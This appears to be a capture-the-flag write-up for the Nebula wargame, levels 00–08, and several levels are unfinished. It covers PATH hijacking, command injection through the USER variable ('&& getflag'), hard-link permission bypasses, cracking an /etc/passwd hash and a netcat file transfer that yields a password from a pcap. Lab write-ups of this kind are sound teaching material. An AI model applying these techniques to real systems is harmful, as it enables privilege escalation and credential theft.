<h1 id="nebula">Nebula</h1>

<p>[TOC]</p>

<h2 id="level-00">Level 00</h2>

<p>This was an easy challenge. The image below should be self explanatory.</p>

<p><img src="images/level00-01.png" alt="level00-01" /></p>

<h2 id="level-01">Level 01</h2>

<p>We know what the code is, which makes this easier to hack. The code makes a system call.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  system("/usr/bin/env echo and now what?");
</code></pre></div></div>

<p>We need to change what the system thinks “echo” means. First let’s create our own echo file.</p>

<p><img src="images/level01-01.png" alt="level01-01" /></p>

<p>Now we need the system to think of our “echo” when the code calls echo. The simplest way to do that is to change where it looks at for the binary “echo”. We will have to change the $PATH variable.</p>

<p><img src="images/level01-02.png" alt="level01-02" /></p>

<p>There you go. Now when the system calls the binary “echo”, it looks at our level01 directory first and finds the symbolic link “echo” to the “/bin/getflag”. The code things that’s the binary the code is referring to and runs the command. The escalated privilage of the code runs the getflag binary with the user flag01 privileges and so we are able to successfully get the flag.</p>

<h2 id="level-02">Level 02</h2>

<p>This was an easy challenge too. The code this time contains.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
</code></pre></div></div>

<p>If we can change the evironment variable USER, we can then make the code run the getflag binary.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USER="&amp;&amp; getflag"
</code></pre></div></div>

<p>Having change the USER evironment variable to that will make the code execute the command</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/echo &amp;&amp; getflag is cool
</code></pre></div></div>

<p>which will run the echo binary and then the getflag binary.</p>

<p><img src="images/level02-01.png" alt="level02-01" /></p>

<h2 id="level-03">Level 03</h2>

<p>// TODO</p>

<h2 id="level-04">Level 04</h2>

<p>In this code, we need to change the name of the file “token”, as the code explicity looks for that name as an exit condition.</p>

<p>Let’s take a look at the <strong>flag04</strong> directory permissions for a second.</p>

<p><img src="images/level04-01.png" alt="level04-01" /></p>

<p>As we don’t have write permission, we cannot rename (or move file to another dir) the token file. We can take a look at the file permissions for token.</p>

<p><img src="images/level04-02.png" alt="level04-02" /></p>

<p>We don’t have write permissions to the file, so we can’t even copy the contents to another file.</p>

<p>What we can do is create a hard link, in level04 directory (because we have write and execute permissions on that and execute permission on the flag04 directory) with a different name.</p>

<p><img src="images/level04-03.png" alt="level04-03" /></p>

<p>Reference: https://stackoverflow.com/questions/40667014/linux-what-are-the-minimum-permissions-required-to-create-a-link-to-a-file</p>

<h2 id="level-05">Level 05</h2>

<p>By the looks of the files in “flag05”, it seems we need to read the files in the .ssh directory. The .backup directory contains a tgz file which contains the .ssh folder in it.</p>

<p>We can try extracting the files from the tgz file.</p>

<p><img src="images/level05-01.png" alt="level05-01" /></p>

<p>All these errors are probably because we don’t have write permission to the directory. If we can somehow move this back-up to another directory with write permission, we would successfully be able to extract the contents.</p>

<p>We cannot copy or move the tgz file because the parent directory doesn’t have write permissions given to us. However we have execute permissions, so we can create a hard link in the level05 directory and as it points to the inode (and hence the same contents) we can then extract it.</p>

<p><img src="images/level05-02.png" alt="level05-02" /></p>

<h2 id="level-06">Level 06</h2>

<p>This was again really simple (?). Sorry if this is starting to sound arrogant. I guess i’m not being too humble.</p>

<p>The problem tells us that it’s following legacy unix system, which means that the password hash is stored in the /etc/passwd file and not the shadow file. A quick brute force hash cracking would give me the password, and then login into the flag06 account and run getflag.</p>

<p><img src="images/level06-01.png" alt="level06-01" /></p>

<p>Run the john the ripper on the hash.</p>

<p><img src="images/level06-02.png" alt="level06-02" /></p>

<p>Login with the password to flag06</p>

<p><img src="images/level06-03.png" alt="level06-03" /></p>

<h2 id="level-07">Level 07</h2>

<p>// TODO</p>

<h2 id="level-08">Level 08</h2>

<p>In the flag08 folder we will see that there is a capture.pcap file. I decided to take that file to my host computer to read it on Wireshark. Now because the VM has blocked port 22, scp is not an option. So I used netcat to help me transfer the file.</p>

<p>On the host machine,</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -l 1234 &gt; output.pcap
</code></pre></div></div>

<p>On the VM</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc 192.168.0.101 1234 &lt; capture.pcap
</code></pre></div></div>

<p>Now that we have the pcap file here, we can now read the contents on it. I prefer to use Wireshark to read it.</p>

<p><img src="images/level08-01.png" alt="level09-01" /></p>

<p>Let’s take a look at the Hexdump.</p>

<p><img src="images/level08-02.png" alt="level08-02" /></p>

<p>Here 7f is DEL and 0d is ENTER. That means that the password is backd00Rmate</p>

<p>Now the login failed because the login username is level08? Let’s try this password on flag08 account.</p>

<p><img src="images/level08-03.png" alt="level08-03" /></p>

